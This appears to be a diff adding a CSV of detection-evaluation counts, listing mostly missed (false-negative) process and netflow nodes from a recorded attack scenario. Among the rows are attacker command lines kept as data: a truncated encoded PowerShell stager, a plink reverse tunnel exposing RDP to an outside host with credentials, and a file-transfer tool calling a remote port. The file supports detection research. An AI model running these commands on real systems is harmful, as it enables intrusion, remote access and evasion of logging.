@@ -1,0 +1,414 @@
+node_group,src_label,count,fraction
+TP_above_threshold,subject: System,1,1.000000000
+FP_above_threshold,subject: System,1,1.000000000
+FN_below_threshold,subject: powershell.exe,206,0.275401070
+FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,124,0.165775401
+FN_below_threshold,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,24,0.032085561
+FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,6,0.008021390
+FN_below_threshold,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,4,0.005347594
+FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe,3,0.004010695
+FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE,3,0.004010695
+FN_below_threshold,subject: System,3,0.004010695
+FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/plink.exe | ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest",2,0.002673797
+FN_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Microsoft Office/Office15/OUTLOOK.EXE,2,0.002673797
+FN_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Chrome/Application/chrome.exe,2,0.002673797
+FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/POWERPNT.EXE"" /AUTOMATION -Embedding",1,0.001336898
+FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/lsass.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"",1,0.001336898
+FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | C:/Windows/System32/svchost.exe -k utcsvc,1,0.001336898
+FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | /SystemRoot/System32/smss.exe 000000e8 00000080 ,1,0.001336898
+FN_below_threshold,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help",1,0.001336898
+FN_below_threshold,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""",1,0.001336898
+FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe,1,0.001336898
+FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe,1,0.001336898
+FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe | C:/Windows/System32/mobsync.exe -Embedding,1,0.001336898
+FN_below_threshold,subject: /SystemRoot/System32/smss.exe | fileTransfer1000.exe  news.com 9999 ,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53474,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53354,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53928,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53473,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53472,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53476,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54006,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53351,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53430,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53887,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53945,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53451,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53488,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53896,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53926,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53914,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54009,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53492,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53489,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53956,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53918,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53416,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53399,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53499,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53415,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53924,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53498,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53982,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53884,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53993,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53878,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53504,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54064,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53503,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53929,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53925,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53357,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53996,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53449,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53885,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53480,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53471,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54001,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53948,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53927,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53485,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53381,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53392,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53931,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53998,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53911,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53916,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53877,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53484,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53475,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53947,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53938,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53456,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53888,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53915,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53936,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53991,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53950,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53382,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53957,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53437,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53990,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54004,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53414,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53411,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53952,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53989,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53900,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53903,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53932,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53417,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53959,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53384,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54003,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53940,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53428,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53348,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53447,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53363,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53487,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53901,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53438,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54002,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53436,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53390,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53986,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53798,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53960,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53955,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53954,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53880,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53902,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53874,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53402,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53904,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53899,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53435,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53419,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53429,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54062,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53369,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53501,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53421,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53491,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53964,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53919,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53934,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53679,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53942,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53921,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53479,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53979,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53395,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54045,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53497,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53987,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53400,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54005,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53958,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53454,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53881,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53445,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53455,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53396,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53379,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53432,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53962,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53500,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53433,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53943,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53935,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53923,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53946,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53383,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53994,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53953,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53995,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53375,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53917,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53453,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53482,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53988,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53441,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53966,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53933,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53516,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53886,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53937,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54012,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53997,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53378,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53939,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53961,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53965,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53470,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53446,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53922,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53366,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53380,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53490,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53385,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53920,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53999,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53450,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53876,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53440,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53401,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53944,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53374,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53443,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54014,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54000,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53889,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53376,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53977,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53486,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53434,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53483,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53502,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53481,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54013,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53983,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53452,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53442,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53439,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53349,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53875,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53985,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53941,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53967,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53444,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54044,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53984,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53360,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53420,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53418,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53879,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53359,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53324,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53330,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53326,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53340,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49986,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53362,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53353,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53336,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53373,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53368,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53319,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53372,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53344,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53320,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53350,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49985,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53318,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53356,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53342,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53332,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53338,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53346,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53328,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50007,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53268,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53334,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53339,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53283,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49972,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53280,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50120,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49969,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53337,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53275,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49989,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50055,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53284,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49997,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50073,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50129,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53347,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49988,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53331,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53309,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49999,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50125,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50057,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49996,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53305,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53301,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50001,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49983,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49974,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50124,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49971,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53279,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50000,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53282,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50126,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50006,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49984,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:51163,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49991,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53370,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49990,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53281,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50008,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53265,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53361,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50009,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53310,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53278,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49980,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53302,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49977,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49931,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53341,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49975,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53371,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50002,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49993,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53343,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49995,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49998,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53292,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53315,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53367,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53285,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49994,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49992,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53250,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53335,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50123,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53306,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50128,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50122,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53290,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53329,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:51149,1,0.001336898
+FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53249,1,0.001336898
